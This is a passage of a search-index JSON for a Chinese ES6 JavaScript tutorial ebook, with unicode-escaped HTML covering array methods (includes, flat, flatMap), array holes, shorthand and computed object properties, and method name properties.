<p>\u8be5\u65b9\u6cd5\u7684\u7b2c\u4e8c\u4e2a\u53c2\u6570\u8868\u793a\u641c\u7d22\u7684\u8d77\u59cb\u4f4d\u7f6e\uff0c\u9ed8\u8ba4\u4e3a<code>0</code>\u3002\u5982\u679c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u4e3a\u8d1f\u6570\uff0c\u5219\u8868\u793a\u5012\u6570\u7684\u4f4d\u7f6e\uff0c\u5982\u679c\u8fd9\u65f6\u5b83\u5927\u4e8e\u6570\u7ec4\u957f\u5ea6\uff08\u6bd4\u5982\u7b2c\u4e8c\u4e2a\u53c2\u6570\u4e3a<code>-4</code>\uff0c\u4f46\u6570\u7ec4\u957f\u5ea6\u4e3a<code>3</code>\uff09\uff0c\u5219\u4f1a\u91cd\u7f6e\u4e3a\u4ece<code>0</code>\u5f00\u59cb\u3002</p> <pre><code>[1, 2, 3].includes(3, 3);  // false\n[1, 2, 3].includes(3, -1); // true\n</code></pre> <p>\u6ca1\u6709\u8be5\u65b9\u6cd5\u4e4b\u524d\uff0c\u6211\u4eec\u901a\u5e38\u4f7f\u7528\u6570\u7ec4\u7684<code>indexOf</code>\u65b9\u6cd5\uff0c\u68c0\u67e5\u662f\u5426\u5305\u542b\u67d0\u4e2a\u503c\u3002</p> <pre><code>if (arr.indexOf(el) !== -1) {\n  // ...\n}\n</code></pre> <p><code>indexOf</code>\u65b9\u6cd5\u6709\u4e24\u4e2a\u7f3a\u70b9\uff0c\u4e00\u662f\u4e0d\u591f\u8bed\u4e49\u5316\uff0c\u5b83\u7684\u542b\u4e49\u662f\u627e\u5230\u53c2\u6570\u503c\u7684\u7b2c\u4e00\u4e2a\u51fa\u73b0\u4f4d\u7f6e\uff0c\u6240\u4ee5\u8981\u53bb\u6bd4\u8f83\u662f\u5426\u4e0d\u7b49\u4e8e<code>-1</code>\uff0c\u8868\u8fbe\u8d77\u6765\u4e0d\u591f\u76f4\u89c2\u3002\u4e8c\u662f\uff0c\u5b83\u5185\u90e8\u4f7f\u7528\u4e25\u683c\u76f8\u7b49\u8fd0\u7b97\u7b26\uff08<code>===</code>\uff09\u8fdb\u884c\u5224\u65ad\uff0c\u8fd9\u4f1a\u5bfc\u81f4\u5bf9<code>NaN</code>\u7684\u8bef\u5224\u3002</p> <pre><code>[NaN].indexOf(NaN)\n// -1\n</code></pre> <p><code>includes</code>\u4f7f\u7528\u7684\u662f\u4e0d\u4e00\u6837\u7684\u5224\u65ad\u7b97\u6cd5\uff0c\u5c31\u6ca1\u6709\u8fd9\u4e2a\u95ee\u9898\u3002</p> <pre><code>[NaN].includes(NaN)\n// true\n</code></pre> <p>\u4e0b\u9762\u4ee3\u7801\u7528\u6765\u68c0\u67e5\u5f53\u524d\u73af\u5883\u662f\u5426\u652f\u6301\u8be5\u65b9\u6cd5\uff0c\u5982\u679c\u4e0d\u652f\u6301\uff0c\u90e8\u7f72\u4e00\u4e2a\u7b80\u6613\u7684\u66ff\u4ee3\u7248\u672c\u3002</p> <pre><code>const contains = (() =&gt;\n  Array.prototype.includes\n    ? (arr, value) =&gt; arr.includes(value)\n    : (arr, value) =&gt; arr.some(el =&gt; el === value)\n)();\ncontains(['foo', 'bar'], 'baz'); // =&gt; false\n</code></pre> <p>\u53e6\u5916\uff0cMap \u548c Set \u6570\u636e\u7ed3\u6784\u6709\u4e00\u4e2a<code>has</code>\u65b9\u6cd5\uff0c\u9700\u8981\u6ce8\u610f\u4e0e<code>includes</code>\u533a\u5206\u3002</p> <ul> <li>Map \u7ed3\u6784\u7684<code>has</code>\u65b9\u6cd5\uff0c\u662f\u7528\u6765\u67e5\u627e\u952e\u540d\u7684\uff0c\u6bd4\u5982<code>Map.prototype.has(key)</code>\u3001<code>WeakMap.prototype.has(key)</code>\u3001<code>Reflect.has(target, propertyKey)</code>\u3002</li> <li>Set \u7ed3\u6784\u7684<code>has</code>\u65b9\u6cd5\uff0c\u662f\u7528\u6765\u67e5\u627e\u503c\u7684\uff0c\u6bd4\u5982<code>Set.prototype.has(value)</code>\u3001<code>WeakSet.prototype.has(value)</code>\u3002</li> </ul>"},{"location":"ebook-JSES6-RYF/09-%E6%95%B0%E7%BB%84/#flatflatmap","title":"\u6570\u7ec4\u5b9e\u4f8b\u7684 flat()\uff0cflatMap()","text":"<p>\u6570\u7ec4\u7684\u6210\u5458\u6709\u65f6\u8fd8\u662f\u6570\u7ec4\uff0c<code>Array.prototype.flat()</code>\u7528\u4e8e\u5c06\u5d4c\u5957\u7684\u6570\u7ec4\u201c\u62c9\u5e73\u201d\uff0c\u53d8\u6210\u4e00\u7ef4\u7684\u6570\u7ec4\u3002\u8be5\u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u65b0\u6570\u7ec4\uff0c\u5bf9\u539f\u6570\u636e\u6ca1\u6709\u5f71\u54cd\u3002</p> <pre><code>[1, 2, [3, 4]].flat()\n// [1, 2, 3, 4]\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u539f\u6570\u7ec4\u7684\u6210\u5458\u91cc\u9762\u6709\u4e00\u4e2a\u6570\u7ec4\uff0c<code>flat()</code>\u65b9\u6cd5\u5c06\u5b50\u6570\u7ec4\u7684\u6210\u5458\u53d6\u51fa\u6765\uff0c\u6dfb\u52a0\u5728\u539f\u6765\u7684\u4f4d\u7f6e\u3002</p> <p><code>flat()</code>\u9ed8\u8ba4\u53ea\u4f1a\u201c\u62c9\u5e73\u201d\u4e00\u5c42\uff0c\u5982\u679c\u60f3\u8981\u201c\u62c9\u5e73\u201d\u591a\u5c42\u7684\u5d4c\u5957\u6570\u7ec4\uff0c\u53ef\u4ee5\u5c06<code>flat()</code>\u65b9\u6cd5\u7684\u53c2\u6570\u5199\u6210\u4e00\u4e2a\u6574\u6570\uff0c\u8868\u793a\u60f3\u8981\u62c9\u5e73\u7684\u5c42\u6570\uff0c\u9ed8\u8ba4\u4e3a1\u3002</p> <pre><code>[1, 2, [3, [4, 5]]].flat()\n// [1, 2, 3, [4, 5]]\n\n[1, 2, [3, [4, 5]]].flat(2)\n// [1, 2, 3, 4, 5]\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>flat()</code>\u7684\u53c2\u6570\u4e3a2\uff0c\u8868\u793a\u8981\u201c\u62c9\u5e73\u201d\u4e24\u5c42\u7684\u5d4c\u5957\u6570\u7ec4\u3002</p> <p>\u5982\u679c\u4e0d\u7ba1\u6709\u591a\u5c11\u5c42\u5d4c\u5957\uff0c\u90fd\u8981\u8f6c\u6210\u4e00\u7ef4\u6570\u7ec4\uff0c\u53ef\u4ee5\u7528<code>Infinity</code>\u5173\u952e\u5b57\u4f5c\u4e3a\u53c2\u6570\u3002</p> <pre><code>[1, [2, [3]]].flat(Infinity)\n// [1, 2, 3]\n</code></pre> <p>\u5982\u679c\u539f\u6570\u7ec4\u6709\u7a7a\u4f4d\uff0c<code>flat()</code>\u65b9\u6cd5\u4f1a\u8df3\u8fc7\u7a7a\u4f4d\u3002</p> <pre><code>[1, 2, , 4, 5].flat()\n// [1, 2, 4, 5]\n</code></pre> <p><code>flatMap()</code>\u65b9\u6cd5\u5bf9\u539f\u6570\u7ec4\u7684\u6bcf\u4e2a\u6210\u5458\u6267\u884c\u4e00\u4e2a\u51fd\u6570\uff08\u76f8\u5f53\u4e8e\u6267\u884c<code>Array.prototype.map()</code>\uff09\uff0c\u7136\u540e\u5bf9\u8fd4\u56de\u503c\u7ec4\u6210\u7684\u6570\u7ec4\u6267\u884c<code>flat()</code>\u65b9\u6cd5\u3002\u8be5\u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u65b0\u6570\u7ec4\uff0c\u4e0d\u6539\u53d8\u539f\u6570\u7ec4\u3002</p> <pre><code>// \u76f8\u5f53\u4e8e [[2, 4], [3, 6], [4, 8]].flat()\n[2, 3, 4].flatMap((x) =&gt; [x, x * 2])\n// [2, 4, 3, 6, 4, 8]\n</code></pre> <p><code>flatMap()</code>\u53ea\u80fd\u5c55\u5f00\u4e00\u5c42\u6570\u7ec4\u3002</p> <pre><code>// \u76f8\u5f53\u4e8e [[[2]], [[4]], [[6]], [[8]]].flat()\n[1, 2, 3, 4].flatMap(x =&gt; [[x * 2]])\n// [[2], [4], [6], [8]]\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u904d\u5386\u51fd\u6570\u8fd4\u56de\u7684\u662f\u4e00\u4e2a\u53cc\u5c42\u7684\u6570\u7ec4\uff0c\u4f46\u662f\u9ed8\u8ba4\u53ea\u80fd\u5c55\u5f00\u4e00\u5c42\uff0c\u56e0\u6b64<code>flatMap()</code>\u8fd4\u56de\u7684\u8fd8\u662f\u4e00\u4e2a\u5d4c\u5957\u6570\u7ec4\u3002</p> <p><code>flatMap()</code>\u65b9\u6cd5\u7684\u53c2\u6570\u662f\u4e00\u4e2a\u904d\u5386\u51fd\u6570\uff0c\u8be5\u51fd\u6570\u53ef\u4ee5\u63a5\u53d7\u4e09\u4e2a\u53c2\u6570\uff0c\u5206\u522b\u662f\u5f53\u524d\u6570\u7ec4\u6210\u5458\u3001\u5f53\u524d\u6570\u7ec4\u6210\u5458\u7684\u4f4d\u7f6e\uff08\u4ece\u96f6\u5f00\u59cb\uff09\u3001\u539f\u6570\u7ec4\u3002</p> <pre><code>arr.flatMap(function callback(currentValue[, index[, array]]) {\n  // ...\n}[, thisArg])\n</code></pre> <p><code>flatMap()</code>\u65b9\u6cd5\u8fd8\u53ef\u4ee5\u6709\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff0c\u7528\u6765\u7ed1\u5b9a\u904d\u5386\u51fd\u6570\u91cc\u9762\u7684<code>this</code>\u3002</p>"},{"location":"ebook-JSES6-RYF/09-%E6%95%B0%E7%BB%84/#_5","title":"\u6570\u7ec4\u7684\u7a7a\u4f4d","text":"<p>\u6570\u7ec4\u7684\u7a7a\u4f4d\u6307\uff0c\u6570\u7ec4\u7684\u67d0\u4e00\u4e2a\u4f4d\u7f6e\u6ca1\u6709\u4efb\u4f55\u503c\u3002\u6bd4\u5982\uff0c<code>Array</code>\u6784\u9020\u51fd\u6570\u8fd4\u56de\u7684\u6570\u7ec4\u90fd\u662f\u7a7a\u4f4d\u3002</p> <pre><code>Array(3) // [, , ,]\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>Array(3)</code>\u8fd4\u56de\u4e00\u4e2a\u5177\u6709 3 \u4e2a\u7a7a\u4f4d\u7684\u6570\u7ec4\u3002</p> <p>\u6ce8\u610f\uff0c\u7a7a\u4f4d\u4e0d\u662f<code>undefined</code>\uff0c\u4e00\u4e2a\u4f4d\u7f6e\u7684\u503c\u7b49\u4e8e<code>undefined</code>\uff0c\u4f9d\u7136\u662f\u6709\u503c\u7684\u3002\u7a7a\u4f4d\u662f\u6ca1\u6709\u4efb\u4f55\u503c\uff0c<code>in</code>\u8fd0\u7b97\u7b26\u53ef\u4ee5\u8bf4\u660e\u8fd9\u4e00\u70b9\u3002</p> <pre><code>0 in [undefined, undefined, undefined] // true\n0 in [, , ,] // false\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u8bf4\u660e\uff0c\u7b2c\u4e00\u4e2a\u6570\u7ec4\u7684 0 \u53f7\u4f4d\u7f6e\u662f\u6709\u503c\u7684\uff0c\u7b2c\u4e8c\u4e2a\u6570\u7ec4\u7684 0 \u53f7\u4f4d\u7f6e\u6ca1\u6709\u503c\u3002</p> <p>ES5 \u5bf9\u7a7a\u4f4d\u7684\u5904\u7406\uff0c\u5df2\u7ecf\u5f88\u4e0d\u4e00\u81f4\u4e86\uff0c\u5927\u591a\u6570\u60c5\u51b5\u4e0b\u4f1a\u5ffd\u7565\u7a7a\u4f4d\u3002</p> <ul> <li><code>forEach()</code>, <code>filter()</code>, <code>reduce()</code>, <code>every()</code> \u548c<code>some()</code>\u90fd\u4f1a\u8df3\u8fc7\u7a7a\u4f4d\u3002</li> <li><code>map()</code>\u4f1a\u8df3\u8fc7\u7a7a\u4f4d\uff0c\u4f46\u4f1a\u4fdd\u7559\u8fd9\u4e2a\u503c</li> <li><code>join()</code>\u548c<code>toString()</code>\u4f1a\u5c06\u7a7a\u4f4d\u89c6\u4e3a<code>undefined</code>\uff0c\u800c<code>undefined</code>\u548c<code>null</code>\u4f1a\u88ab\u5904\u7406\u6210\u7a7a\u5b57\u7b26\u4e32\u3002</li> </ul> <pre><code>// forEach\u65b9\u6cd5\n[,'a'].forEach((x,i) =&gt; console.log(i)); // 1\n\n// filter\u65b9\u6cd5\n['a',,'b'].filter(x =&gt; true) // ['a','b']\n\n// every\u65b9\u6cd5\n[,'a'].every(x =&gt; x==='a') // true\n\n// reduce\u65b9\u6cd5\n[1,,2].reduce((x,y) =&gt; x+y) // 3\n\n// some\u65b9\u6cd5\n[,'a'].some(x =&gt; x !== 'a') // false\n\n// map\u65b9\u6cd5\n[,'a'].map(x =&gt; 1) // [,1]\n\n// join\u65b9\u6cd5\n[,'a',undefined,null].join('#') // \"#a##\"\n\n// toString\u65b9\u6cd5\n[,'a',undefined,null].toString() // \",a,,\"\n</code></pre> <p>ES6 \u5219\u662f\u660e\u786e\u5c06\u7a7a\u4f4d\u8f6c\u4e3a<code>undefined</code>\u3002</p> <p><code>Array.from</code>\u65b9\u6cd5\u4f1a\u5c06\u6570\u7ec4\u7684\u7a7a\u4f4d\uff0c\u8f6c\u4e3a<code>undefined</code>\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u8fd9\u4e2a\u65b9\u6cd5\u4e0d\u4f1a\u5ffd\u7565\u7a7a\u4f4d\u3002</p> <pre><code>Array.from(['a',,'b'])\n// [ \"a\", undefined, \"b\" ]\n</code></pre> <p>\u6269\u5c55\u8fd0\u7b97\u7b26\uff08<code>...</code>\uff09\u4e5f\u4f1a\u5c06\u7a7a\u4f4d\u8f6c\u4e3a<code>undefined</code>\u3002</p> <pre><code>[...['a',,'b']]\n// [ \"a\", undefined, \"b\" ]\n</code></pre> <p><code>copyWithin()</code>\u4f1a\u8fde\u7a7a\u4f4d\u4e00\u8d77\u62f7\u8d1d\u3002</p> <pre><code>[,'a','b',,].copyWithin(2,0) // [,\"a\",,\"a\"]\n</code></pre> <p><code>fill()</code>\u4f1a\u5c06\u7a7a\u4f4d\u89c6\u4e3a\u6b63\u5e38\u7684\u6570\u7ec4\u4f4d\u7f6e\u3002</p> <pre><code>new Array(3).fill('a') // [\"a\",\"a\",\"a\"]\n</code></pre> <p><code>for...of</code>\u5faa\u73af\u4e5f\u4f1a\u904d\u5386\u7a7a\u4f4d\u3002</p> <pre><code>let arr = [, ,];\nfor (let i of arr) {\n  console.log(1);\n}\n// 1\n// 1\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6570\u7ec4<code>arr</code>\u6709\u4e24\u4e2a\u7a7a\u4f4d\uff0c<code>for...of</code>\u5e76\u6ca1\u6709\u5ffd\u7565\u5b83\u4eec\u3002\u5982\u679c\u6539\u6210<code>map</code>\u65b9\u6cd5\u904d\u5386\uff0c\u7a7a\u4f4d\u662f\u4f1a\u8df3\u8fc7\u7684\u3002</p> <p><code>entries()</code>\u3001<code>keys()</code>\u3001<code>values()</code>\u3001<code>find()</code>\u548c<code>findIndex()</code>\u4f1a\u5c06\u7a7a\u4f4d\u5904\u7406\u6210<code>undefined</code>\u3002</p> <pre><code>// entries()\n[...[,'a'].entries()] // [[0,undefined], [1,\"a\"]]\n\n// keys()\n[...[,'a'].keys()] // [0,1]\n\n// values()\n[...[,'a'].values()] // [undefined,\"a\"]\n\n// find()\n[,'a'].find(x =&gt; true) // undefined\n\n// findIndex()\n[,'a'].findIndex(x =&gt; true) // 0\n</code></pre> <p>\u7531\u4e8e\u7a7a\u4f4d\u7684\u5904\u7406\u89c4\u5219\u975e\u5e38\u4e0d\u7edf\u4e00\uff0c\u6240\u4ee5\u5efa\u8bae\u907f\u514d\u51fa\u73b0\u7a7a\u4f4d\u3002</p>"},{"location":"ebook-JSES6-RYF/10-%E5%AF%B9%E8%B1%A1%E7%9A%84%E6%96%B0%E5%A2%9E%E5%B1%9E%E6%80%A7/","title":"\u5bf9\u8c61\u7684\u5c5e\u6027","text":"<p>\u7edf\u8ba1\u4fe1\u606f\uff1a\u5b57\u6570 18200  \u9605\u8bfb37\u5206\u949f</p> <p>\u672c\u7ae0\u4ecb\u7ecd\u5bf9\u8c61\u6570\u636e\u7ed3\u6784\u6539\u53d8</p>"},{"location":"ebook-JSES6-RYF/10-%E5%AF%B9%E8%B1%A1%E7%9A%84%E6%96%B0%E5%A2%9E%E5%B1%9E%E6%80%A7/#_2","title":"\u5c5e\u6027\u7684\u7b80\u6d01\u8868\u793a\u6cd5","text":"<p>ES6 \u5141\u8bb8\u76f4\u63a5\u5199\u5165\u53d8\u91cf\u548c\u51fd\u6570\uff0c\u4f5c\u4e3a\u5bf9\u8c61\u7684\u5c5e\u6027\u548c\u65b9\u6cd5\u3002</p> <pre><code>const foo = 'bar';\nconst baz = {foo};\nbaz // {foo: \"bar\"}\n\n// \u7b49\u540c\u4e8e\nconst baz = {foo: foo};\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u8868\u660e\uff0cES6 \u5141\u8bb8\u5728\u5bf9\u8c61\u4e4b\u4e2d\uff0c\u76f4\u63a5\u5199\u53d8\u91cf\u3002\u8fd9\u65f6\uff0c\u5c5e\u6027\u540d\u4e3a\u53d8\u91cf\u540d, \u5c5e\u6027\u503c\u4e3a\u53d8\u91cf\u7684\u503c\u3002</p> <pre><code>function fun(x, y) {\n  return {x, y};\n}\n\n// \u7b49\u540c\u4e8e\n\nfunction f(x, y) {\n  return {x: x, y: y};\n}\n\nf(1, 2) // Object {x: 1, y: 2}\n</code></pre> <p>\u9664\u4e86\u5c5e\u6027\u7b80\u5199\uff0c\u65b9\u6cd5\u4e5f\u53ef\u4ee5\u7b80\u5199\u3002</p> <pre><code>const o = {\n  eat() {\n    return \"Eat\";\n  }\n};\n\n// \u7b49\u540c\u4e8e\nconst o = {\n  method: function() {\n    return \"Hello!\";\n  }\n};\n</code></pre> <p>\u4f8b\u5b50</p> <pre><code>let name = \"Michael\";\nlet age = 10;\nconst Person = {\n  name,\n  age,\n  eat() {\n    console.log(`My name is ${name}, I am ${age}.`)\n  }\n}\n</code></pre> <p>\u8fd9\u79cd\u5199\u6cd5\u7528\u4e8e\u51fd\u6570\u7684\u8fd4\u56de\u503c\uff0c\u5c06\u4f1a\u975e\u5e38\u65b9\u4fbf\u3002</p> <pre><code>function getPoint() {\n  const x = 1;\n  const y = 10;\n  return {x, y};\n}\n\ngetPoint()\n// {x:1, y:10}\n</code></pre> <p>CommonJS \u6a21\u5757\u8f93\u51fa\u4e00\u7ec4\u53d8\u91cf\uff0c\u5c31\u975e\u5e38\u5408\u9002\u4f7f\u7528\u7b80\u6d01\u5199\u6cd5\u3002</p> <pre><code>let ms = {};\nfunction getItem (key) {\n  return key in ms ? ms[key] : null;\n}\nfunction setItem (key, value) {\n  ms[key] = value;\n}\nfunction clear () {\n  ms = {};\n}\nmodule.exports = { getItem, setItem, clear };\n// \u7b49\u540c\u4e8e\nmodule.exports = {\n  getItem: getItem,\n  setItem: setItem,\n  clear: clear\n};\n</code></pre> <p>\u5c5e\u6027\u7684\u8d4b\u503c\u5668\uff08setter\uff09\u548c\u53d6\u503c\u5668\uff08getter\uff09\uff0c\u4e8b\u5b9e\u4e0a\u4e5f\u662f\u91c7\u7528\u8fd9\u79cd\u5199\u6cd5\u3002</p> <pre><code>const cart = {\n  _wheels: 4,\n  get wheels () {\n    return this._wheels;\n  },\n  set wheels (value) {\n    if (value &lt; this._wheels) {\n      throw new Error('\u6570\u503c\u592a\u5c0f\u4e86\uff01');\n    }\n    this._wheels = value;\n  }\n}\n</code></pre> <p>\u6ce8\u610f\uff0c\u7b80\u6d01\u5199\u6cd5\u7684\u5c5e\u6027\u540d\u603b\u662f\u5b57\u7b26\u4e32\uff0c\u8fd9\u4f1a\u5bfc\u81f4\u4e00\u4e9b\u770b\u4e0a\u53bb\u6bd4\u8f83\u5947\u602a\u7684\u7ed3\u679c\u3002</p> <pre><code>const obj = {\n  class () {}\n};\n// \u7b49\u540c\u4e8e\nvar obj = {\n  'class': function() {}\n};\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>class</code>\u662f\u5b57\u7b26\u4e32\uff0c\u6240\u4ee5\u4e0d\u4f1a\u56e0\u4e3a\u5b83\u5c5e\u4e8e\u5173\u952e\u5b57\uff0c\u800c\u5bfc\u81f4\u8bed\u6cd5\u89e3\u6790\u62a5\u9519\u3002</p> <p>\u5982\u679c\u67d0\u4e2a\u65b9\u6cd5\u7684\u503c\u662f\u4e00\u4e2a Generator \u51fd\u6570\uff0c\u524d\u9762\u9700\u8981\u52a0\u4e0a\u661f\u53f7\u3002</p> <pre><code>const obj = {\n  * m() {\n    yield 'hello world';\n  }\n};\n</code></pre>"},{"location":"ebook-JSES6-RYF/10-%E5%AF%B9%E8%B1%A1%E7%9A%84%E6%96%B0%E5%A2%9E%E5%B1%9E%E6%80%A7/#_3","title":"\u5c5e\u6027\u540d\u8868\u8fbe\u5f0f","text":"<p>JavaScript \u5b9a\u4e49\u5bf9\u8c61\u7684\u5c5e\u6027\uff0c\u6709\u4e24\u79cd\u65b9\u6cd5\u3002</p> <pre><code>// \u65b9\u6cd5\u4e00\nobj.foo = true;\n\n// \u65b9\u6cd5\u4e8c\nobj['a' + 'bc'] = 123;\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u7684\u65b9\u6cd5\u4e00\u662f\u76f4\u63a5\u7528\u6807\u8bc6\u7b26\u4f5c\u4e3a\u5c5e\u6027\u540d\uff0c\u65b9\u6cd5\u4e8c\u662f\u7528\u8868\u8fbe\u5f0f\u4f5c\u4e3a\u5c5e\u6027\u540d\uff0c\u8fd9\u65f6\u8981\u5c06\u8868\u8fbe\u5f0f\u653e\u5728\u65b9\u62ec\u53f7\u4e4b\u5185\u3002</p> <p>\u4f46\u662f\uff0c\u5982\u679c\u4f7f\u7528\u5b57\u9762\u91cf\u65b9\u5f0f\u5b9a\u4e49\u5bf9\u8c61\uff08\u4f7f\u7528\u5927\u62ec\u53f7\uff09\uff0c\u5728 ES5 \u4e2d\u53ea\u80fd\u4f7f\u7528\u65b9\u6cd5\u4e00\uff08\u6807\u8bc6\u7b26\uff09\u5b9a\u4e49\u5c5e\u6027\u3002</p> <pre><code>var obj = {\n  foo: true,\n  abc: 123\n};\n</code></pre> <p>ES6 \u5141\u8bb8\u5b57\u9762\u91cf\u5b9a\u4e49\u5bf9\u8c61\u65f6\uff0c\u7528\u65b9\u6cd5\u4e8c\uff08\u8868\u8fbe\u5f0f\uff09\u4f5c\u4e3a\u5bf9\u8c61\u7684\u5c5e\u6027\u540d\uff0c\u5373\u628a\u8868\u8fbe\u5f0f\u653e\u5728\u65b9\u62ec\u53f7\u5185\u3002</p> <pre><code>let propKey = 'foo';\nlet obj = {\n  [propKey]: true,\n  ['a' + 'bc']: 123\n};\n</code></pre> <p>\u4e0b\u9762\u662f\u53e6\u4e00\u4e2a\u4f8b\u5b50\u3002</p> <pre><code>let lastWord = 'last word';\nconst a = {\n  'first word': 'hello',\n  [lastWord]: 'world'\n};\n\na['first word'] // \"hello\"\na[lastWord] // \"world\"\na['last word'] // \"world\"\n</code></pre> <p>\u8868\u8fbe\u5f0f\u8fd8\u53ef\u4ee5\u7528\u4e8e\u5b9a\u4e49\u65b9\u6cd5\u540d\u3002</p> <pre><code>let obj = {\n  ['h' + 'ello']() {\n    return 'hi';\n  }\n};\n\nobj.hello() // hi\n</code></pre> <p>\u6ce8\u610f\uff0c\u5c5e\u6027\u540d\u8868\u8fbe\u5f0f\u4e0e\u7b80\u6d01\u8868\u793a\u6cd5\uff0c\u4e0d\u80fd\u540c\u65f6\u4f7f\u7528\uff0c\u4f1a\u62a5\u9519\u3002</p> <pre><code>// \u62a5\u9519\nconst foo = 'bar';\nconst bar = 'abc';\nconst baz = { [foo] };\n\n// \u6b63\u786e\nconst foo = 'bar';\nconst baz = { [foo]: 'abc'};\n</code></pre> <p>\u6ce8\u610f\uff0c\u5c5e\u6027\u540d\u8868\u8fbe\u5f0f\u5982\u679c\u662f\u4e00\u4e2a\u5bf9\u8c61\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u4f1a\u81ea\u52a8\u5c06\u5bf9\u8c61\u8f6c\u4e3a\u5b57\u7b26\u4e32<code>[object Object]</code>\uff0c\u8fd9\u4e00\u70b9\u8981\u7279\u522b\u5c0f\u5fc3\u3002</p> <pre><code>const keyA = {a: 1};\nconst keyB = {b: 2};\n\nconst myObject = {\n  [keyA]: 'valueA',\n  [keyB]: 'valueB'\n};\n\nmyObject // Object {[object Object]: \"valueB\"}\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>[keyA]</code>\u548c<code>[keyB]</code>\u5f97\u5230\u7684\u90fd\u662f<code>[object Object]</code>\uff0c\u6240\u4ee5<code>[keyB]</code>\u4f1a\u628a<code>[keyA]</code>\u8986\u76d6\u6389\uff0c\u800c<code>myObject</code>\u6700\u540e\u53ea\u6709\u4e00\u4e2a<code>[object Object]</code>\u5c5e\u6027\u3002</p>"},{"location":"ebook-JSES6-RYF/10-%E5%AF%B9%E8%B1%A1%E7%9A%84%E6%96%B0%E5%A2%9E%E5%B1%9E%E6%80%A7/#name","title":"\u65b9\u6cd5\u7684 name \u5c5e\u6027","text":"<p>\u51fd\u6570\u7684<code>name</code>\u5c5e\u6027\uff0c\u8fd4\u56de\u51fd\u6570\u540d\u3002\u5bf9\u8c61\u65b9\u6cd5\u4e5f\u662f\u51fd\u6570\uff0c\u56e0\u6b64\u4e5f\u6709<code>name</code>\u5c5e\u6027\u3002</p> <pre><code>const person = {\n  sayName() {\n    console.log('hello!');\n  },\n};\nperson.sayName.name   // \"sayName\"\n</code></pre> <p>\u5982\u679c\u5bf9\u8c61\u7684\u65b9\u6cd5\u4f7f\u7528\u4e86\u53d6\u503c\u51fd\u6570\uff08<code>getter</code>\uff09\u548c\u5b58\u503c\u51fd\u6570\uff08<code>setter</code>\uff09\uff0c\u5219<code>name</code>\u5c5e\u6027\u4e0d\u662f\u5728\u8be5\u65b9\u6cd5\u4e0a\u9762\uff0c\u800c\u662f\u8be5\u65b9\u6cd5\u7684\u5c5e\u6027\u7684\u63cf\u8ff0\u5bf9\u8c61\u7684<code>get</code>\u548c<code>set</code>\u5c5e\u6027\u4e0a\u9762\uff0c\u8fd4\u56de\u503c\u662f\u65b9\u6cd5\u540d\u524d\u52a0\u4e0a<code>get</code>\u548c<code>set</code>\u3002</p> <pre><code>const obj = {\n  get foo() {},\n  set foo(x) {}\n};\n\nobj.foo.name\n// TypeError: Cannot read property 'name' of undefined\n\nconst descriptor = Object.getOwnPropertyDescriptor(obj, 'foo');\n\ndescriptor.get.name // \"get foo\"\ndescriptor.set.name // \"set foo\"\n</code></pre> <p>\u6709\u4e24\u79cd\u7279\u6b8a\u60c5\u51b5\uff1a<code>bind</code>\u65b9\u6cd5\u521b\u9020\u7684\u51fd\u6570\uff0c<code>name</code>\u5c5e\u6027\u8fd4\u56de<code>bound</code>\u52a0\u4e0a\u539f\u51fd\u6570\u7684\u540d\u5b57\uff1b<code>Function</code>\u6784\u9020\u51fd\u6570\u521b\u9020\u7684\u51fd\u6570\uff0c<code>name</code>\u5c5e\u6027\u8fd4\u56de<code>anonymous</code>\u3002</p> <pre><code>(new Function()).name // \"anonymous\"\n\nvar doSomething = function() {\n  // ...\n};\ndoSomething.bind().name // \"bound doSomething\"\n</code></pre> <p>\u5982\u679c\u5bf9\u8c61\u7684\u65b9\u6cd5\u662f\u4e00\u4e2a Symbol \u503c\uff0c\u90a3\u4e48<code>name</code>\u5c5e\u6027\u8fd4\u56de\u7684\u662f\u8fd9\u4e2a Symbol \u503c\u7684\u63cf\u8ff0\u3002</p> <pre><code>const key1 = Symbol('description');\nconst key2 = Symbol();\nlet obj = {\n  [key1]() {},\n  [key2]() {},\n};\nobj[key1].name // \"[description]\"\nobj[key2].name // \"\"\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>key1</code>\u5bf9\u5e94\u7684 Symbol \u503c\u6709\u63cf\u8ff0\uff0c<code>key2</code>\u6ca1\u6709\u3002</p>"},{"location":"ebook-JSES6-RYF/10-%E5%AF%B9%E8%B1%A1%E7%9A%84%E6%96%B0%E5%A2%9E%E5%B1%9E%E6%80%A7/#_4","title":"\u53ef\u679a\u4e3e\u6027\u5c5e\u6027\u548c\u904d\u5386","text":""},{"location":"ebook-JSES6-RYF/10-%E5%AF%B9%E8%B1%A1%E7%9A%84%E6%96%B0%E5%A2%9E%E5%B1%9E%E6%80%A7/#_5","title":"\u53ef\u679a\u4e3e\u6027","text":"<p>\u5bf9\u8c61\u7684\u6bcf\u4e2a\u5c5e\u6027\u90fd\u6709\u4e00\u4e2a\u63cf\u8ff0\u5bf9\u8c61\uff08Descriptor\uff09\uff0c\u7528\u6765\u63a7\u5236\u8be5\u5c5e\u6027\u7684\u884c\u4e3a\u3002<code>Object.getOwnPropertyDescriptor</code>\u65b9\u6cd5\u53ef\u4ee5\u83b7\u53d6\u8be5\u5c5e\u6027\u7684\u63cf\u8ff0\u5bf9\u8c61\u3002</p> <pre><code>let obj = { foo: 123 };\nObject.getOwnPropertyDescriptor(obj, 'foo')\nObject.getOwnPropertyDescriptor(obj, length); // 